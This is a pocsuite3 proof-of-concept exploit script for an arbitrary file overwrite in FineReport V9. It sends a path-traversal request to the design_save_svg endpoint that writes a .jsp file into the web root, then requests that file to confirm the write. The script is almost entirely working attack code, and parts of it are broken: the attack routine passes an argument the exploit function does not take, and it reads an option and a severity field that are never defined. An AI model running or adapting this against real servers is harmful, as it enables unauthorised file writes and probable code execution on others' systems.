#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
)
from time import time
from json import dumps
import random
from urllib.parse import   urljoin
import os
minimum_version_required('2.0.2')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = ''
    vulDate = '2023-03-23'
    createDate = '2023-03-23'
    updateDate = '2023-03-23'
    references = []
    name = 'FineReport v9 Arbitrary File Overwrite'
    appPowerLink = ''
    appName = ''
    appVersion = 'V9.0'
    vulType = 'Other'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''
    randomstrs=str(random.gauss(5,1))
    # def _options(self):
    #     o = OrderedDict()
    #     o['param'] = OptString('', description='The param')
    #     return o

    def _exploit(self):
        api_url="/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/a.svg.jsp"
        headers = {'Content-Type': 'application/json'}
        
        payload = {"__CONTENT__":self.randomstrs,"__CHARSET__":"UTF-8"}

        res = requests.post(urljoin(self.url,api_url), headers=headers, data=payload)
        logger.debug(res.text)

        res2=requests.get(url=urljoin(self.url,'/WebReport/a.svg.jsp'))
        logger.debug(res2.text)       
        return res2.text
    

    def _verify(self):
        result = {}
        res = self._exploit()
        if self.randomstrs in res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['info'] = {}
            result['VerifyInfo']['info']['Severity']=self.severity
            result['VerifyInfo']['info']['Result']=res
            result['VerifyInfo']['info']['file_name'] = os.path.basename(__file__)
        return self.parse_output(result)

    def _attack(self):
        result = {}
        param = self.get_option('param')
        res = self._exploit(param)
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url
        result['VerifyInfo'][param] = res
        return self.parse_output(result)

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
